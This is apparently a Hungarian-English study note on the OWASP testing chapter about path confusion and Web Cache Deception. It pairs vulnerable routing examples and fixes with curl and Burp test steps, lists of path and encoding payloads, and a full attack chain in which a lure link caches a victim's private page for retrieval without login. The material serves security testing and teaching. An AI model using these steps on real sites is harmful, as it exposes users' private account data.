# WSTG-CONF-13: Path Confusion Tesztelése

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy **helytelen routing configuration** (path confusion) **Web Cache Deception** attack-ot tesz lehetővé, ahol az **attacker cache-eli a victim privát adatait** egy **public cached path**-en keresztül. **Weak regex** vagy **improper path handling** miatt a `/dashboard/non.js` path ugyanúgy működik mint `/dashboard`, de **CDN cache-eli** → **sensitive data leak**.

⚠️ **NE KEVERD ÖSSZE:** Ez NEM path traversal! Ez **path confusion** - amikor különböző path-ek ugyanazt a content-et szolgálják ki, és **caching** miatt **privát adat** publikusan cache-elődik.

---

## Mi a cél?

**Application path-ek helyes konfigurációjának ellenőrzése:**
- Improper routing (weak regex)
- Path normalization issues
- Web Cache Deception vulnerability

---

## Path Confusion Concept

### Normál működés:
```
User requests: /dashboard
Server returns: User's private dashboard
Cache: NOT cached (private content)
```

---

### Path Confusion:
```
Attacker request: /dashboard/non.js
Server: Matches /dashboard route (weak regex!)
Server returns: User's private dashboard
CDN: Sees ".js" extension → CACHES IT!

Later:
Attacker requests: /dashboard/non.js
CDN: Returns CACHED victim's dashboard
→ Sensitive data leaked!
```

---

## Web Cache Deception Attack

### Attack Flow:

**1. Attacker crafts malicious link:**
```
https://victim.com/dashboard/malicious.css
```

---

**2. Victim clicks link (or attacker tricks them):**
```
GET /dashboard/malicious.css HTTP/1.1
Host: victim.com
Cookie: sessionid=victim_session_123
```

---

**3. Server responds (weak routing):**
```
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
  Welcome, John Doe!
  Account Balance: $50,000
  SSN: 123-45-6789
</body>
</html>
```

---

**4. CDN caches response (sees .css extension):**
```
CDN: ".css" file → Cache it!
Cached as: /dashboard/malicious.css
```

---

**5. Attacker requests same URL (without victim's session):**
```
GET /dashboard/malicious.css HTTP/1.1
Host: victim.com
(no authentication cookie)
```

**CDN returns cached version:**
```
HTTP/1.1 200 OK
X-Cache: HIT
Content-Type: text/html

<html>
<body>
  Welcome, John Doe!
  Account Balance: $50,000
  SSN: 123-45-6789
</body>
</html>
```

→ **CRITICAL!** Victim's private data leaked!

---

## Vulnerable Routing Patterns

### Example #1: **Django Weak Regex**

**Vulnerable code:**
```python
from django.urls import re_path
from . import views

urlpatterns = [
    re_path(r'.*^dashboard', views.dashboard, name='dashboard'),
]
```

**Problem:**
- `.*^dashboard` matches:
  - `/dashboard` ✓
  - `/dashboard/anything.js` ✓
  - `/user/dashboard/file.css` ✓
  - ANY path ending with "dashboard"!

---

**Exploit:**
```
https://victim.com/dashboard/malicious.js
→ Matches route!
→ Shows dashboard
→ CDN caches (sees .js)
→ Attacker retrieves cached version
```

---

### Example #2: **Express.js Wildcard**

**Vulnerable code:**
```javascript
app.get('/dashboard*', (req, res) => {
    res.render('dashboard', { userData: req.user });
});
```

**Problem:**
- Matches `/dashboard/anything`
- Including `/dashboard/fake.css`

---

### Example #3: **Apache RewriteRule**

**Vulnerable config:**
```apache
RewriteRule ^/dashboard.* /dashboard.php [L]
```

**Matches:**
- `/dashboard.php` ✓
- `/dashboard.css` ✓
- `/dashboard/test.js` ✓

---

### Example #4: **nginx location**

**Vulnerable config:**
```nginx
location ~ ^/dashboard {
    proxy_pass http://backend;
}
```

**Matches:**
- `/dashboard` ✓
- `/dashboard/file.js` ✓
- `/dashboardXYZ` ✓

---

## Tesztelési Módszerek

### Tool #1: **Manual Testing (curl)**

#### Test Workflow:

**1. Identify private endpoint:**
```bash
curl https://victim.com/dashboard -H "Cookie: session=abc123"
```

**Response:**
```html
<html>
<body>
  Account Balance: $10,000
  Email: user@victim.com
</body>
</html>
```

---

**2. Test with fake static file extension:**
```bash
# Try various extensions
curl https://victim.com/dashboard/test.js -H "Cookie: session=abc123"
curl https://victim.com/dashboard/test.css -H "Cookie: session=abc123"
curl https://victim.com/dashboard/test.png -H "Cookie: session=abc123"
```

**If vulnerable:**
```html
HTTP/1.1 200 OK
Content-Type: text/html  (should be application/javascript!)

<html>
<body>
  Account Balance: $10,000
  Email: user@victim.com
</body>
</html>
```

→ **VULNERABLE!** Path confusion!

---

**3. Check cache headers:**
```bash
curl -I https://victim.com/dashboard/test.css
```

**If CDN caches:**
```
HTTP/1.1 200 OK
X-Cache: HIT
Cache-Control: public, max-age=3600
```

→ **CRITICAL!** Cached private data!

---

**4. Verify cache (no authentication):**
```bash
# Request without cookies
curl https://victim.com/dashboard/test.css
```

**If cached:**
```html
<html>
<body>
  Account Balance: $10,000  ← From cache!
  Email: user@victim.com
</body>
</html>
```

→ **Confirmed vulnerability!**

---

### Tool #2: **Burp Suite Repeater**

#### Steps:
```
1. Intercept request to /dashboard
2. Send to Repeater
3. Modify path: /dashboard → /dashboard/test.js
4. Send request
5. Check response (should be 404, but if 200 → vulnerable)
6. Check cache headers (X-Cache: HIT?)
```

---

### Tool #3: **ZAP Active Scan**

```
1. Spider the target
2. Identify private endpoints
3. Active Scan
4. Manual verification with path confusion payloads
```

---

## Common Test Payloads

### Static File Extensions:

```
/dashboard/test.js
/dashboard/test.css
/dashboard/test.png
/dashboard/test.jpg
/dashboard/test.gif
/dashboard/test.svg
/dashboard/test.woff
/dashboard/test.pdf
/dashboard/test.json
/dashboard/test.xml
```

---

### Path Variations:

```
/dashboard/
/dashboard/.
/dashboard/..
/dashboard//
/dashboard;.js
/dashboard%2f.js
/dashboard%2e.js
/dashboard?x=.js
```

---

### Encoded Variations:

```
/dashboard%2Ftest.css
/dashboard%252Ftest.css
/dashboard%5Ctest.css
/dashboard..%2Ftest.css
```

---

## CDN Detection

### Check CDN Presence:

```bash
# Check headers
curl -I https://victim.com | grep -iE "x-cache|cf-ray|x-amz|x-served-by"
```

**Common CDN Headers:**

| CDN | Header |
|-----|--------|
| Cloudflare | `CF-Ray:`, `CF-Cache-Status:` |
| Akamai | `X-Akamai-Request-ID:`, `X-Cache:` |
| Fastly | `X-Served-By:`, `Fastly-Stats:` |
| AWS CloudFront | `X-Amz-Cf-Id:`, `X-Cache:` |
| Azure CDN | `X-Azure-Ref:`, `X-Cache:` |

---

### WHOIS Check:

```bash
# Get IP
dig victim.com +short

# Check WHOIS
whois 104.26.10.123 | grep -i "OrgName"
# → OrgName: Cloudflare, Inc.
```

---

## White-Box Testing

### Code Review - Django:

**Vulnerable:**
```python
urlpatterns = [
    re_path(r'.*^dashboard', views.dashboard),  # VULNERABLE!
]
```

**Secure:**
```python
urlpatterns = [
    re_path(r'^dashboard$', views.dashboard),  # Exact match only
]
```

---

### Code Review - Express.js:

**Vulnerable:**
```javascript
app.get('/dashboard*', handler);  // VULNERABLE!
```

**Secure:**
```javascript
app.get('/dashboard', handler);  // Exact match
// Or use strict routing
app.set('strict routing', true);
```

---

### Code Review - Flask:

**Vulnerable:**
```python
@app.route('/dashboard', defaults={'path': ''})
@app.route('/dashboard/<path:path>')  # VULNERABLE!
def dashboard(path):
    return render_template('dashboard.html')
```

**Secure:**
```python
@app.route('/dashboard')  # Exact match only
def dashboard():
    return render_template('dashboard.html')
```

---

## Cache Control Headers

### Proper Headers (Prevent Caching):

```
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0
```

---

### Example Response:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: no-store, private
X-Frame-Options: DENY

<html>
<body>
  Private dashboard content
</body>
</html>
```

→ CDN should NOT cache

---

## Real-World Examples

### Example #1: **PayPal (2018)**

**Vulnerability:**
- Path confusion in billing section
- `/myaccount/home/xx.css` showed account info
- CDN cached it
- Attacker retrieved cached private data

---

### Example #2: **Cloudflare (Research)**

**Vulnerability:**
- Path normalization differences
- Backend: `/path/../admin` → `/admin`
- CDN: `/path/../admin` → Different cache key
- Cache poisoning possible

---

## Exploitation Scenario

### Full Attack Chain:

**1. Reconnaissance:**
```bash
# Find private endpoints
curl https://victim.com/profile
curl https://victim.com/account
curl https://victim.com/dashboard
```

---

**2. Test path confusion:**
```bash
# Test with fake extensions
curl https://victim.com/profile/test.js -H "Cookie: session=victim"
curl https://victim.com/account/test.css -H "Cookie: session=victim"
curl https://victim.com/dashboard/test.png -H "Cookie: session=victim"
```

**Vulnerable:**
```
/dashboard/test.js → 200 OK (shows dashboard!)
```

---

**3. Check caching:**
```bash
curl -I https://victim.com/dashboard/test.js
```

**Response:**
```
X-Cache: MISS (first request)
Cache-Control: public, max-age=3600
```

---

**4. Social engineering:**
```
Attacker sends email to victim:
"Check out this cool feature: https://victim.com/dashboard/promo.js"

Victim clicks (authenticated) → CDN caches response
```

---

**5. Retrieve cached data:**
```bash
# Attacker requests same URL (no auth)
curl https://victim.com/dashboard/promo.js
```

**Response:**
```
HTTP/1.1 200 OK
X-Cache: HIT

<html>
<body>
  Welcome, John Smith!
  Balance: $50,000
  SSN: 123-45-6789
</body>
</html>
```

→ **Data leaked!**

---

## Gyakorlati Cheat Sheet

| Teszt | Parancs |
|-------|---------|
| Path confusion test | `curl URL/dashboard/test.js` |
| CDN detection | `curl -I URL \| grep -i x-cache` |
| Cache header check | `curl -I URL \| grep cache-control` |
| Authenticated test | `curl URL/path/file.js -H "Cookie: ..."` |
| Unauthenticated test | `curl URL/path/file.js` (no cookie) |

---

## Fontos Toolok

### Manual:
- **curl** - HTTP testing
- **Browser DevTools** - Header inspection

### Proxy:
- **Burp Suite** - Repeater, Intruder
- **ZAP** - Active scan

### Automated:
- Custom scripts for path fuzzing

---

## Védelem (Remediation)

### 1. **Strict Routing (Exact Match):**

**Django:**
```python
urlpatterns = [
    re_path(r'^dashboard$', views.dashboard),  # Exact!
]
```

**Express.js:**
```javascript
app.get('/dashboard', handler);  // Exact!
app.set('strict routing', true);
```

---

### 2. **Proper Cache Headers:**

```python
# Django
@cache_control(no_cache=True, no_store=True, must_revalidate=True, private=True)
def dashboard(request):
    return render(request, 'dashboard.html')
```

```javascript
// Express.js
app.get('/dashboard', (req, res) => {
    res.set({
        'Cache-Control': 'no-store, no-cache, must-revalidate, private',
        'Pragma': 'no-cache',
        'Expires': '0'
    });
    res.render('dashboard');
});
```

---

### 3. **Content-Type Based Caching:**

**CDN Config:**
```
Cache only if:
- Content-Type: application/javascript
- Content-Type: text/css
- Content-Type: image/*

DO NOT cache if:
- Content-Type: text/html
```

---

### 4. **RFC Compliant 404:**

```python
# Return proper 404 for non-existent paths
urlpatterns = [
    path('dashboard/', views.dashboard),
    # Do NOT use wildcard catches!
]
```

**If `/dashboard/test.js` requested:**
```
→ 404 Not Found (not matching dashboard handler)
```

---

### 5. **Validate File Extensions:**

```python
from django.http import Http404

def dashboard(request, path=''):
    if path:  # If extra path provided
        raise Http404()
    return render(request, 'dashboard.html')
```

---

### 6. **CDN Configuration:**

**Cloudflare Page Rule:**
```
If URL matches: *victim.com/dashboard*
Then:
  Cache Level: Bypass
```

**AWS CloudFront Behavior:**
```
Path Pattern: /dashboard*
Cache Policy: Disabled
```

---

## Fontos Megjegyzések

✅ **Path confusion** = különböző path-ek, same content  
✅ **Web Cache Deception** = private data cached publicly  
✅ **Weak regex** = `.*^dashboard` = vulnerable!  
✅ **Static extensions** (`.js`, `.css`) = cached by CDN  
✅ **Cache-Control: private** = prevents caching  
❌ **Wildcard routing** = path confusion risk!  
⚠️ **PayPal, Cloudflare** = real vulnerabilities!  
⚠️ **Social engineering** = trick victim to cache data  

---

**Összefoglalva:** Ez a fejezet a **path confusion** vulnerability-ről szól. **Helytelen routing configuration** (weak regex mint `.*^dashboard`) miatt a `/dashboard/test.js` ugyanúgy működik mint `/dashboard`, de a **CDN** a `.js` extension miatt **cache-eli** → **Web Cache Deception attack**. Az **attacker trick-eli a victim**-et, hogy klikkeljen egy linkre (`/dashboard/malicious.css`), a **victim's private data cache-elődik**, majd az **attacker authentication nélkül** lekéri a **cached version**-t → **sensitive data leak**! **Defense**: **strict routing** (exact match `^dashboard$`), **proper Cache-Control headers** (`no-store, private`), **content-type based caching**, és **RFC compliant 404** handling!
